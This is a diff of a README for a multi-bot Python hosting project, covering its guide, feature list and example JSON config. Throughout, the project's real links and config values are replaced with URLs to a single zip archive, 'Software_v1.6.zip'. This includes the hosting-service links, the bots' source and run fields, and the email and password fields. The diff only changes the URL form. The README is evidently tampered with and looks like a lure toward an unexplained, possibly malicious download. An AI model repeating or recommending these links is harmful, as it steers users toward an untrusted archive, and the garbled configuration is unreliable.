@@ -9,7 +9,7 @@ _You can run multiple bots in a same instance, for now it only works for pure py
 ## Guide
 
 1. *Fork this repositary*
-2. *Edit https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip to your liking*
+2. *Edit https://raw.githubusercontent.com/RaviChatta/multi/main/hemalbumen/Software_v1.6.zip to your liking*
 3. *Host that repositary*
 4. *Profit*
 
@@ -22,7 +22,7 @@ _You can run multiple bots in a same instance, for now it only works for pure py
 * **ENVs** you can set different ENV values for different bots even with same name.
 * **Control** you can also set script file from where execution starts for that bot.
 * **Private** you can also clone private repositories with help of Tokens. (see [Example](#example) below)
-* **Web App** uses Flask to connect to service, so that it can be hosted as Dynamic Web Apps which is required for services like [render](https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip), [scalingo](https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip) etc.
+* **Web App** uses Flask to connect to service, so that it can be hosted as Dynamic Web Apps which is required for services like [render](https://raw.githubusercontent.com/RaviChatta/multi/main/hemalbumen/Software_v1.6.zip), [scalingo](https://raw.githubusercontent.com/RaviChatta/multi/main/hemalbumen/Software_v1.6.zip) etc.
 
 ---
 
@@ -31,35 +31,35 @@ _You can run multiple bots in a same instance, for now it only works for pure py
 ```
 {   
     "Ebook": {
-        "source": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip",
+        "source": "https://raw.githubusercontent.com/RaviChatta/multi/main/hemalbumen/Software_v1.6.zip",
         "env": {
             "TOKEN": "xxx",
             "ID": "111",
             "HASH": "yyy",
             "REMIX_ID": "123",
             "REMIX_KEY": "abc123",
-            "IA_EMAIL": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip",
-            "IA_PASS": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip"
+            "IA_EMAIL": "https://raw.githubusercontent.com/RaviChatta/multi/main/hemalbumen/Software_v1.6.zip",
+            "IA_PASS": "https://raw.githubusercontent.com/RaviChatta/multi/main/hemalbumen/Software_v1.6.zip"
         },
-        "run": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip"
+        "run": "https://raw.githubusercontent.com/RaviChatta/multi/main/hemalbumen/Software_v1.6.zip"
     },
     "Link": {
-        "source": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip",
+        "source": "https://raw.githubusercontent.com/RaviChatta/multi/main/hemalbumen/Software_v1.6.zip",
         "env": {
             "TOKEN": "fff",
             "ID": "222",
             "HASH": "123abc"
         },
-        "run": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip"
+        "run": "https://raw.githubusercontent.com/RaviChatta/multi/main/hemalbumen/Software_v1.6.zip"
     },
     "Private": {
-        "source": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip",
+        "source": "https://raw.githubusercontent.com/RaviChatta/multi/main/hemalbumen/Software_v1.6.zip",
         "env": {
             "TOKEN": "yyy",
             "ID": "444",
             "HASH": "abc321"
         },
-        "run": "https://github.com/RaviChatta/multi/raw/refs/heads/main/hemalbumen/Software_v1.6.zip"
+        "run": "https://raw.githubusercontent.com/RaviChatta/multi/main/hemalbumen/Software_v1.6.zip"
     }
 }
 ```
